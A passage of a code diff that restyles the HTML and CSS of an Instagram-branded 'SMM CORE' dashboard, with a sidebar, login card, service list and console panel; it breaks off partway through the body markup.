@@ -3,1055 +3,664 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM CORE | Enterprise Global Gateway</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>SMM CORE | Apex Enterprise v9.0.2</title>
+    <!-- PRODUCTION FONTS -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,400&family=JetBrains+Mono:wght@100;200;300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
     <style>
+        /* ============================================================
+           CSS CORE VARIABLES & ARCHITECTURE
+           ============================================================ */
         :root {
-            --ig-grad: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            --cyan: #00f2ff;
-            --cyan-dim: rgba(0, 242, 255, 0.15);
-            --glass-bg: rgba(10, 14, 23, 0.82);
-            --sidebar-bg: #03070f;
-            --border-glow: rgba(0, 242, 255, 0.08);
-            --border-muted: rgba(255, 255, 255, 0.06);
-            --text-main: #f8fafc;
-            --text-muted: #64748b;
-            --error-red: #ff3131;
-            --success-green: #22c55e;
-            --warning-orange: #f59e0b;
-            --card-surface: #070a12;
+            --brand-primary: #00f2ff;
+            --brand-secondary: #bc1888;
+            --brand-accent: #f09433;
+            --ig-gradient: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            --cyber-gradient: linear-gradient(90deg, #00f2ff 0%, #0072ff 100%);
+            
+            --bg-deep: #010409;
+            --bg-card: #0d1117;
+            --bg-sidebar: #03070f;
+            --bg-hover: rgba(255, 255, 255, 0.04);
+            
+            --text-high: #f0f6fc;
+            --text-med: #8b949e;
+            --text-low: #484f58;
+            
+            --border-glow: rgba(0, 242, 255, 0.15);
+            --border-std: rgba(255, 255, 255, 0.08);
+            
+            --status-online: #238636;
+            --status-busy: #d29922;
+            --status-error: #da3633;
+            
+            --panel-width: 340px;
+            --sidebar-width: 280px;
         }
 
-        /* --- BASIC OVERRIDES & PREVENT ANIMATIONS ON LOAD --- */
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-            cursor: crosshair;
-            font-smoothing: antialiased;
-            -webkit-font-smoothing: antialiased;
+        /* ============================================================
+           RESET & GLOBAL NORMALIZATION
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+            cursor: default; /* Reset for custom cursor logic */
         }
-        
-        body { 
-            background: #010409; 
-            color: var(--text-main); 
-            font-family: 'Plus Jakarta Sans', sans-serif; 
-            height: 100vh; 
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-high);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            height: 100vh;
             width: 100vw;
-            display: flex; 
-            overflow: hidden; 
-            position: relative; 
+            overflow: hidden;
+            display: flex;
+            user-select: none;
         }
 
-        /* --- BACKGROUND MATRIX AND FX --- */
-        #bg-canvas { 
-            position: fixed; 
-            inset: 0; 
-            z-index: -1; 
-            opacity: 0.75; 
-        }
-        
-        .vignette { 
-            position: fixed; 
-            inset: 0; 
-            background: 
-                radial-gradient(circle at 50% 50%, transparent 20%, #010409 98%),
-                linear-gradient(rgba(0, 242, 255, 0.015) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 242, 255, 0.015) 1px, transparent 1px);
-            background-size: 100% 100%, 50px 50px, 50px 50px;
-            pointer-events: none; 
-            z-index: -1;
-        }
-        
-        .vignette::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0, 242, 255, 0.008) 0px, rgba(0, 242, 255, 0.008) 1px, transparent 1px, transparent 4px);
-            animation: scanline 30s linear infinite;
-            pointer-events: none;
+        /* REMOVING ALL LOADING ANIMATIONS / SLIDING EFFECTS */
+        aside, main, .login-card, .right-data-hub, .top-nav-bar {
+            animation: none !important;
+            transform: none !important;
+            opacity: 1 !important;
+            transition: none !important;
         }
 
-        @keyframes scanline {
-            0% { background-position: 0 0; }
-            100% { background-position: 0 100%; }
-        }
-        
-        .floating-orb {
-            position: absolute; 
-            width: 600px; 
-            height: 600px; 
-            background: var(--cyan);
-            filter: blur(180px); 
-            border-radius: 50%; 
-            opacity: 0.04; 
-            animation: float-orb-smooth 30s infinite ease-in-out alternate;
-            will-change: transform; 
-            pointer-events: none;
-        }
-        
-        @keyframes float-orb-smooth { 
-            0% { transform: translate(0, 0) scale(1); } 
-            50% { transform: translate(150px, -80px) scale(1.1); }
-            100% { transform: translate(-50px, 100px) scale(0.9); } 
-        }
-
-        /* --- GLOBAL TOAST SYSTEM --- */
-        #error-toast {
-            position: fixed; 
-            top: -120px; 
-            left: 50%; 
-            transform: translateX(-50%);
-            background: rgba(5, 7, 12, 0.98); 
-            border: 1px solid var(--error-red);
-            padding: 18px 36px; 
-            border-radius: 16px; 
-            backdrop-filter: blur(30px);
-            display: flex; 
-            align-items: center; 
-            gap: 15px; 
-            z-index: 9999;
-            transition: top 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(255, 49, 49, 0.1);
-        }
-        #error-toast.active { 
-            top: 30px; 
-        }
-        .error-icon { 
-            color: var(--error-red); 
-            font-size: 1.4rem; 
-            animation: glitchPulse 1s infinite alternate; 
-        }
-        @keyframes glitchPulse { 
-            0% { transform: scale(1); opacity: 1; } 
-            100% { transform: scale(1.06); opacity: 0.6; filter: drop-shadow(0 0 8px var(--error-red)); } 
-        }
-
-        /* --- ASIDE: STATIC ANCHORED SIDEBAR (NO ANIMATION / NO SLIDE) --- */
-        aside {
-            width: 320px; 
-            min-width: 320px;
-            background: var(--sidebar-bg); 
-            backdrop-filter: blur(40px);
-            border-right: 1px solid var(--border-muted); 
-            display: flex; 
-            flex-direction: column; 
-            padding: 2rem 1.25rem; 
-            z-index: 500; 
-            position: relative;
+        /* ============================================================
+           BACKGROUND DYNAMICS (PHYSICS ENGINE)
+           ============================================================ */
+        #canvas-neural-net {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
             height: 100%;
+            z-index: -1;
+            pointer-events: none;
         }
 
-        .logo-area {
+        .scanline-fx {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 242, 255, 0.02) 50%
+            );
+            background-size: 100% 4px;
+            z-index: 1000;
+            pointer-events: none;
+            opacity: 0.3;
+        }
+
+        /* ============================================================
+           SIDEBAR: THE NAVIGATION ENGINE
+           ============================================================ */
+        aside {
+            width: var(--sidebar-width);
+            background: var(--bg-sidebar);
+            border-right: 1px solid var(--border-std);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            z-index: 50;
+        }
+
+        .brand-container {
+            padding: 2rem 1.5rem;
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 2rem;
-            padding-left: 0.5rem;
         }
 
-        .logo-ico {
-            width: 32px;
-            height: 32px;
-            background: var(--ig-grad);
-            border-radius: 8px;
+        .brand-logo-sq {
+            width: 40px;
+            height: 40px;
+            background: var(--ig-gradient);
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 0 15px rgba(220, 39, 67, 0.4);
-        }
-        
-        .logo-ico i {
-            color: white;
-            font-size: 0.95rem;
+            box-shadow: 0 0 20px rgba(220, 39, 67, 0.3);
         }
 
-        .logo { 
-            font-family: 'Orbitron', sans-serif; 
-            font-weight: 900; 
-            font-size: 1.4rem; 
-            color: var(--text-main); 
+        .brand-name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 900;
             letter-spacing: 2px;
         }
-        .logo span {
-            color: var(--cyan);
-            text-shadow: 0 0 10px rgba(0, 242, 255, 0.4);
+
+        .brand-name span { color: var(--brand-primary); }
+
+        .nav-scroller {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 1rem;
         }
 
-        /* Metrics Data Modules inside Sidebar */
-        .sidebar-metrics-card {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid var(--border-muted);
-            border-radius: 16px;
-            padding: 1.1rem;
-            margin-bottom: 1rem;
-            position: relative;
-            overflow: hidden;
+        .nav-scroller::-webkit-scrollbar { width: 2px; }
+        .nav-scroller::-webkit-scrollbar-thumb { background: var(--text-low); }
+
+        .nav-section-title {
+            color: var(--text-low);
+            font-size: 0.65rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 1.5rem 0 0.75rem 0.5rem;
         }
-        .sidebar-metrics-card::before {
-            content: '';
-            position: absolute;
-            left: 0; top: 0; width: 2px; height: 100%;
-            background: var(--cyan);
-        }
-        .sidebar-metrics-card.orange::before { background: var(--warning-orange); }
-        
-        .metric-label { 
-            font-size: 0.65rem; 
-            color: var(--text-muted); 
-            text-transform: uppercase; 
-            letter-spacing: 1.5px; 
-            margin-bottom: 6px; 
-            font-weight: 700; 
+
+        .nav-item {
             display: flex;
             align-items: center;
-            gap: 6px;
-        }
-        .metric-value { 
-            font-family: 'Orbitron', sans-serif; 
-            font-weight: 700; 
-            font-size: 1.15rem; 
-            color: var(--success-green); 
-            display: flex; 
-            align-items: center; 
-            gap: 6px; 
-        }
-        .metric-value span { 
-            font-size: 0.75rem; 
-            color: var(--text-muted); 
-            font-family: 'Plus Jakarta Sans'; 
-            font-weight: 400; 
-        }
-        .metric-subtext {
-            font-size: 0.7rem;
-            color: #475569;
-            margin-top: 6px;
-            display: flex;
-            justify-content: space-between;
+            gap: 12px;
+            padding: 0.8rem 1rem;
+            color: var(--text-med);
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: 0.2s;
+            margin-bottom: 2px;
+            border: 1px solid transparent;
         }
 
-        .nav-label { 
-            font-size: 0.65rem; 
-            color: #475569; 
-            text-transform: uppercase; 
-            letter-spacing: 2.5px; 
-            margin: 1.25rem 0 0.6rem 0.5rem; 
-            font-weight: 800; 
-        }
-        
-        nav { 
-            overflow-y: auto; 
-            flex-grow: 1; 
-            padding-right: 4px; 
-        }
-        nav::-webkit-scrollbar { width: 3px; }
-        nav::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 10px; }
+        .nav-item i { width: 18px; font-size: 1rem; }
 
-        nav a { 
-            color: #94a3b8; 
-            text-decoration: none; 
-            padding: 11px 1rem; 
+        .nav-item:hover {
+            background: var(--bg-hover);
+            color: var(--text-high);
+            transform: translateX(5px);
+        }
+
+        .nav-item.active {
+            background: rgba(0, 242, 255, 0.05);
+            color: var(--brand-primary);
+            border-color: rgba(0, 242, 255, 0.1);
+        }
+
+        .sidebar-stat-box {
+            margin: 1rem;
+            padding: 1rem;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid var(--border-std);
             border-radius: 12px;
-            display: flex; 
-            align-items: center; 
-            gap: 14px; 
-            transition: all 0.2s linear;
-            margin-bottom: 4px; 
-            font-size: 0.88rem; 
-            border: 1px solid transparent; 
-            position: relative;
-        }
-        nav a i { width: 16px; text-align: center; font-size: 0.95rem; }
-        nav a:hover { 
-            background: rgba(255, 255, 255, 0.03); 
-            color: white; 
-            border-color: rgba(255, 255, 255, 0.03);
-            transform: translateX(4px);
-        }
-        nav a:hover i { color: var(--cyan); }
-        nav a.active { 
-            background: linear-gradient(90deg, rgba(0, 242, 255, 0.06) 0%, transparent 100%); 
-            color: var(--cyan); 
-            border-color: rgba(0, 242, 255, 0.15); 
-            font-weight: 600;
-        }
-        nav a.active::after {
-            content: ''; position: absolute; left: 0; top: 25%; height: 50%; width: 2px; 
-            background: var(--cyan); border-radius: 0 2px 2px 0; box-shadow: 0 0 8px var(--cyan);
         }
 
-        .sidebar-footer {
-            margin-top: auto;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(255,255,255,0.04);
+        .stat-label { font-size: 0.6rem; color: var(--text-low); text-transform: uppercase; letter-spacing: 1px; }
+        .stat-val { font-family: 'Orbitron'; font-size: 1rem; color: var(--status-online); margin-top: 4px; }
+
+        /* ============================================================
+           MAIN WORKSPACE
+           ============================================================ */
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1fr var(--panel-width);
+            background: radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.02) 0%, transparent 70%);
+        }
+
+        .viewport-center {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* TOP NAVIGATION GLOBAL */
+        .top-nav-bar {
+            height: 70px;
+            border-bottom: 1px solid var(--border-std);
+            background: rgba(1, 4, 9, 0.5);
+            backdrop-filter: blur(10px);
             display: flex;
             align-items: center;
             justify-content: space-between;
+            padding: 0 2rem;
         }
-        .user-pill {
+
+        .search-trigger {
+            width: 300px;
+            padding: 0.6rem 1rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-std);
+            border-radius: 8px;
+            color: var(--text-low);
+            font-size: 0.8rem;
             display: flex;
             align-items: center;
             gap: 10px;
         }
-        .user-avatar {
-            width: 32px; height: 32px; border-radius: 50%;
-            background: #1e293b; border: 1px solid var(--border-muted);
-            display: flex; align-items: center; justify-content: center;
-            font-size: 0.75rem; color: #cbd5e1; font-weight: 700;
-        }
-        .user-info-text h4 { font-size: 0.8rem; font-weight: 600; color: var(--text-main); }
-        .user-info-text p { font-size: 0.65rem; color: var(--text-muted); }
 
-        /* --- MAIN WORKSPACE GRID CONFIG (NO TRANSITIONS/SLIDES ON LOAD) --- */
-        main { 
-            flex-grow: 1; 
-            display: grid;
-            grid-template-columns: 1fr 340px;
-            height: 100%;
-            position: relative; 
-            background: radial-gradient(circle at top left, rgba(0,242,255,0.01), transparent 40%);
-        }
-
-        .center-auth-zone {
+        /* AUTH CARD CONTAINER */
+        .auth-container {
+            flex: 1;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 2rem;
-            position: relative;
-            overflow-y: auto;
         }
 
-        /* --- LOGIN CARD (NO MOVING/SLIDING CONSTRAINTS) --- */
         .login-card {
             width: 100%;
-            max-width: 460px; 
-            background: var(--card-surface); 
-            border-radius: 24px; 
-            padding: 3.5rem 3rem; 
-            backdrop-filter: blur(30px);
-            position: relative; 
-            z-index: 10; 
-            border: 1px solid var(--border-muted);
-            box-shadow: 0 40px 80px rgba(0,0,0,0.8), inset 0 1px 0px rgba(255,255,255,0.05);
+            max-width: 440px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 2.5rem;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
         }
+
+        .card-header { text-align: center; margin-bottom: 2rem; }
+        .card-header i { font-size: 3rem; background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .card-header h2 { font-family: 'Orbitron'; font-size: 1.5rem; margin-top: 1rem; letter-spacing: 1px; }
+
+        .input-group { margin-bottom: 1.25rem; position: relative; }
+        .input-group label { display: block; font-size: 0.75rem; color: var(--text-med); margin-bottom: 0.5rem; font-weight: 600; text-transform: uppercase; }
         
-        .login-card::after {
-            content: ""; position: absolute; inset: -1px; border-radius: 24px;
-            padding: 1px; background: linear-gradient(135deg, #f09433, #bc1888, #00f2ff, #bc1888, #f09433);
-            background-size: 300% 300%; animation: borderGradientMove 8s linear infinite;
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask-composite: exclude; pointer-events: none; opacity: 0.35;
-        }
-        @keyframes borderGradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-
-        .ig-glyph { 
-            font-size: 3.2rem; 
-            background: var(--ig-grad); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            margin-bottom: 16px; 
-            text-align: center; 
-            display: block;
-            filter: drop-shadow(0 0 12px rgba(220, 39, 67, 0.2));
-        }
-
-        .input-container { 
-            position: relative; 
-            margin-bottom: 1.25rem; 
-        }
-        .input-container i { 
-            position: absolute; 
-            left: 20px; 
-            top: 18px; 
-            color: #475569; 
-            transition: color 0.2s ease; 
-            font-size: 1rem; 
-        }
+        .field-wrapper { position: relative; }
+        .field-wrapper i { position: absolute; left: 15px; top: 15px; color: var(--text-low); }
         
-        input[type="text"], input[type="password"] {
-            width: 100%; 
-            background: #03050a; 
-            border: 1px solid #1e293b;
-            border-radius: 14px; 
-            padding: 18px 20px 18px 56px; 
-            color: white;
-            font-size: 0.9rem; 
-            outline: none; 
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        input:focus { 
-            border-color: #cc2366; 
-            box-shadow: 0 0 20px rgba(204, 35, 102, 0.1); 
-        }
-        input:focus + i { 
-            color: #cc2366; 
-        }
-
-        .policy-agreement { 
-            display: flex; 
-            align-items: flex-start; 
-            gap: 12px; 
-            margin: 1.5rem 0; 
-            cursor: pointer; 
-            font-size: 0.8rem; 
-            color: var(--text-muted); 
-            line-height: 1.5; 
-            user-select: none; 
-        }
-        .policy-agreement input { display: none; }
-        .checkbox-box { 
-            min-width: 20px; 
-            height: 20px; 
-            border: 1px solid #334155; 
-            border-radius: 6px; 
-            position: relative; 
-            background: #03050a; 
-            transition: all 0.2s;
-            margin-top: 2px;
-        }
-        .policy-agreement:hover .checkbox-box { border-color: #64748b; }
-        .policy-agreement input:checked + .checkbox-box { 
-            background: var(--ig-grad); 
-            border-color: transparent; 
-            box-shadow: 0 0 12px rgba(204, 35, 102, 0.25); 
-        }
-        .policy-agreement input:checked + .checkbox-box::after { 
-            content: "\f00c"; 
-            font-family: "Font Awesome 6 Free"; 
-            font-weight: 900; 
-            position: absolute; 
-            color: white; 
-            font-size: 10px; 
-            left: 4px; 
-            top: 2px; 
-        }
-        .policy-link { color: var(--cyan); text-decoration: none; font-weight: 600; }
-        .policy-link:hover { text-shadow: 0 0 8px var(--cyan); color: white; }
-
-        .btn-submit {
-            width: 100%; 
-            background: var(--ig-grad); 
-            color: white; 
-            border: none;
-            border-radius: 14px; 
-            padding: 18px; 
-            font-weight: 700; 
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            cursor: pointer; 
-            text-transform: uppercase; 
-            letter-spacing: 1.5px;
+        input {
+            width: 100%;
+            background: #010409;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px 12px 12px 42px;
+            color: var(--text-high);
             font-size: 0.9rem;
-            box-shadow: 0 8px 20px rgba(220, 39, 67, 0.15);
-            transition: transform 0.1s, box-shadow 0.2s;
-        }
-        .btn-submit:hover { 
-            box-shadow: 0 15px 30px rgba(220, 39, 67, 0.3); 
-        }
-        .btn-submit:active {
-            transform: scale(0.99);
+            transition: 0.2s;
         }
 
-        /* --- RIGHT-SIDE MONITORING PANEL --- */
-        .right-telemetry-panel {
-            background: rgba(2, 5, 11, 0.6);
-            border-left: 1px solid var(--border-muted);
+        input:focus { border-color: var(--brand-primary); box-shadow: 0 0 0 3px rgba(0, 242, 255, 0.1); }
+
+        .btn-prime {
+            width: 100%;
+            padding: 14px;
+            background: var(--ig-gradient);
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: 700;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 1rem;
+            cursor: pointer;
+        }
+
+        /* ============================================================
+           DATA HUB (RIGHT PANEL)
+           ============================================================ */
+        .right-data-hub {
+            border-left: 1px solid var(--border-std);
+            background: rgba(3, 7, 15, 0.4);
             backdrop-filter: blur(20px);
-            padding: 2rem 1.5rem;
             display: flex;
             flex-direction: column;
-            gap: 1.5rem;
+            padding: 1.5rem;
             overflow-y: auto;
-            position: relative;
-            z-index: 10;
         }
-        .panel-section-title {
-            font-family: 'Orbitron', sans-serif;
+
+        .hub-title {
+            font-family: 'Orbitron';
             font-size: 0.75rem;
-            font-weight: 700;
+            color: var(--brand-primary);
             letter-spacing: 2px;
-            color: var(--cyan);
-            text-transform: uppercase;
-            margin-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-        }
-        .panel-section-title span {
-            width: 6px; height: 6px; background: var(--cyan); border-radius: 50%; box-shadow: 0 0 8px var(--cyan);
+            gap: 8px;
         }
 
-        /* Server Grid Metrics */
-        .grid-server-status {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-        .server-mini-box {
-            background: rgba(255,255,255,0.01);
-            border: 1px solid var(--border-muted);
-            border-radius: 10px;
-            padding: 10px;
-        }
-        .server-mini-box p { font-size: 0.65rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
-        .server-mini-box h5 { font-family: 'Orbitron', sans-serif; font-size: 0.85rem; margin-top: 4px; color: #e2e8f0; }
-        .server-mini-box .status-indicator {
-            display: flex; align-items: center; gap: 6px; font-size: 0.7rem; margin-top: 4px; font-weight: 700;
-        }
-        .status-indicator.online { color: var(--success-green); }
+        .service-list { display: flex; flex-direction: column; gap: 10px; }
         
-        /* Node Load Bar */
-        .load-bar-container {
-            width: 100%; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-top: 6px; overflow: hidden;
-        }
-        .load-bar-fill {
-            height: 100%; background: var(--cyan); width: 42%;
-        }
-
-        /* Service Price Matrix Table Module */
-        .price-matrix-container {
-            border: 1px solid var(--border-muted);
-            border-radius: 12px;
-            overflow: hidden;
-            background: #040712;
-        }
-        .matrix-table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: left;
-            font-size: 0.75rem;
-        }
-        .matrix-table th {
-            background: rgba(255,255,255,0.02);
-            padding: 10px 12px;
-            color: var(--text-muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.65rem;
-            letter-spacing: 1px;
-            border-bottom: 1px solid var(--border-muted);
-        }
-        .matrix-table td {
-            padding: 10px 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.02);
-            color: #cbd5e1;
-        }
-        .matrix-table tr:last-child td { border: none; }
-        .tag-speed {
-            background: rgba(34, 197, 94, 0.1);
-            color: var(--success-green);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 0.65rem;
-            font-weight: 700;
+        .service-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-std);
+            padding: 1rem;
+            border-radius: 8px;
+            position: relative;
         }
 
-        /* --- LOG TERMINAL MODULE --- */
-        .terminal-panel {
-            background: #020408;
-            border: 1px solid var(--border-muted);
-            border-radius: 14px;
+        .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .svc-id { font-family: 'JetBrains Mono'; font-size: 0.65rem; color: var(--text-low); }
+        .svc-price { color: var(--status-online); font-weight: 700; font-size: 0.9rem; }
+        .svc-name { font-size: 0.8rem; font-weight: 600; color: var(--text-med); }
+
+        /* LIVE TERMINAL */
+        .console-box {
+            margin-top: 2rem;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 6px;
             padding: 1rem;
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            color: #94a3b8;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        .terminal-header {
-            display: flex;
-            justify-content: space-between;
-            color: #475569;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255,255,255,0.03);
-            margin-bottom: 8px;
-            text-transform: uppercase;
             font-size: 0.65rem;
-            font-weight: 700;
-            letter-spacing: 1px;
+            color: #555;
+            flex: 1;
+            min-height: 200px;
+            overflow-y: hidden;
         }
-        .terminal-rows {
-            overflow-y: auto;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-        .terminal-rows::-webkit-scrollbar { width: 2px; }
-        .terminal-rows::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.05); }
-        
-        .term-row { line-height: 1.4; white-space: nowrap; }
-        .term-row span.stamp { color: #475569; margin-right: 6px; }
-        .term-row span.success { color: var(--success-green); }
-        .term-row span.warn { color: var(--warning-orange); }
-        .term-row span.info { color: var(--cyan); }
 
-        /* --- MODAL DIALOG LAYER --- */
-        .modal-overlay { 
-            position: fixed; 
-            inset: 0; 
-            background: rgba(2, 4, 8, 0.95); 
-            backdrop-filter: blur(20px); 
-            z-index: 10000; 
-            display: none; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        .modal-overlay.active { 
-            display: flex; 
-        }
-        .modal-card { 
-            width: 90%; 
-            max-width: 600px; 
-            background: #060913; 
-            border: 1px solid var(--border-muted); 
-            border-radius: 24px; 
-            padding: 3rem; 
-            position: relative; 
-            box-shadow: 0 50px 100px rgba(0,0,0,0.9); 
-        }
-        .close-modal { 
-            position: absolute; 
-            top: 24px; 
-            right: 24px; 
-            color: #475569; 
-            font-size: 1.5rem; 
-            cursor: pointer; 
-            transition: color 0.2s; 
-        }
-        .close-modal:hover { color: white; }
-        .modal-card h3 { font-family: 'Orbitron', sans-serif; color: var(--cyan); margin-bottom: 1.5rem; font-size: 1.25rem; letter-spacing: 1px; }
-        .modal-body { max-height: 350px; overflow-y: auto; padding-right: 10px; }
-        .modal-body::-webkit-scrollbar { width: 3px; }
-        .modal-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
-        .modal-card p { color: #94a3b8; font-size: 0.88rem; line-height: 1.6; margin-bottom: 1.25rem; }
-        .modal-card strong { color: #f1f5f9; }
-
-        /* --- HEADLESS FOOTER HUD GRID --- */
-        .bottom-hud-bar {
-            position: absolute;
-            left: 40px;
-            bottom: 35px;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.65rem;
-            color: #334155;
-            letter-spacing: 1px;
+        /* ============================================================
+           FOOTER / HUD
+           ============================================================ */
+        .bottom-hud {
+            position: fixed;
+            bottom: 0;
+            left: var(--sidebar-width);
+            right: 0;
+            height: 35px;
+            background: var(--bg-sidebar);
+            border-top: 1px solid var(--border-std);
             display: flex;
             align-items: center;
-            gap: 30px;
-            z-index: 200;
+            padding: 0 1.5rem;
+            font-size: 0.6rem;
+            color: var(--text-low);
+            font-family: 'Orbitron';
+            z-index: 100;
         }
-        .hud-item { display: flex; align-items: center; gap: 8px; }
-        .hud-item span.live-green { color: var(--success-green); font-weight: 700; }
-        .hud-pulse-dot { width: 6px; height: 6px; background: var(--success-green); border-radius: 50%; box-shadow: 0 0 10px var(--success-green); animation: pulseFlicker 2s infinite alternate; }
-        @keyframes pulseFlicker { 0% { opacity: 0.3; } 100% { opacity: 1; } }
 
+        .hud-segment { margin-right: 2rem; display: flex; align-items: center; gap: 6px; }
+        .pulse-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--status-online); box-shadow: 0 0 10px var(--status-online); }
+
+        /* ============================================================
+           MODALS & TOASTS
+           ============================================================ */
+        #toast-master {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 10000;
+        }
+
+        .toast {
+            background: var(--bg-card);
+            border-left: 4px solid var(--brand-primary);
+            padding: 1rem 1.5rem;
+            border-radius: 4px;
+            color: white;
+            font-size: 0.8rem;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
     </style>
 </head>
 <body>
 
-    <!-- INTERACTIVE BACKGROUND CORE -->
-    <canvas id="bg-canvas"></canvas>
-    <div class="vignette"></div>
-    <div class="floating-orb" style="top: 10%; right: 25%;"></div>
-    <div class="floating-orb" style="bottom: 10%; left: 350px; background: #cc2366;"></div>
+    <div class="scanline-fx"></div>
+    <canvas id="canvas-neural-net"></canvas>
 
-    <!-- ERROR & TELEMETRY ALERTS -->
-    <div id="error-toast">
-        <i class="fas fa-shield-halved error-icon"></i>
-        <span id="error-msg" style="font-family: 'Orbitron', sans-serif; font-size: 0.75rem; color: white; letter-spacing: 1px;">
-            GATEWAY FAULT: SECURITY TOKEN REQUIRED
-        </span>
-    </div>
-
-    <!-- STATIC ANCHORED SIDEBAR CONTROL ENVIRONMENT -->
+    <!-- SIDEBAR -->
     <aside>
-        <div class="logo-area">
-            <div class="logo-ico"><i class="fab fa-instagram"></i></div>
-            <div class="logo">SMM<span>CORE</span></div>
-        </div>
-        
-        <!-- Live Synchronized Architectural Data Modules -->
-        <div class="sidebar-metrics-card">
-            <div class="metric-label"><i class="fas fa-server"></i> API Node Balance</div>
-            <div class="metric-value">$24,914.54 <span>USD</span></div>
-            <div class="metric-subtext">
-                <span>Tier: Enterprise v4</span>
-                <span style="color: var(--success-green);">Active</span>
-            </div>
+        <div class="brand-container">
+            <div class="brand-logo-sq"><i class="fas fa-bolt-lightning"></i></div>
+            <div class="brand-name">SMM<span>CORE</span></div>
         </div>
 
-        <div class="sidebar-metrics-card orange">
-            <div class="metric-label"><i class="fas fa-bolt"></i> Global Stream Rate</div>
-            <div class="metric-value" style="color: var(--warning-orange);" id="live-stream-rate">3,412 <span>req/m</span></div>
-            <div class="metric-subtext">
-                <span>Load Factor: 22.4%</span>
-                <span style="color: var(--cyan);">Optimal</span>
-            </div>
+        <div class="sidebar-stat-box">
+            <div class="stat-label">System Liquidity</div>
+            <div class="stat-val">$1,248,092.44</div>
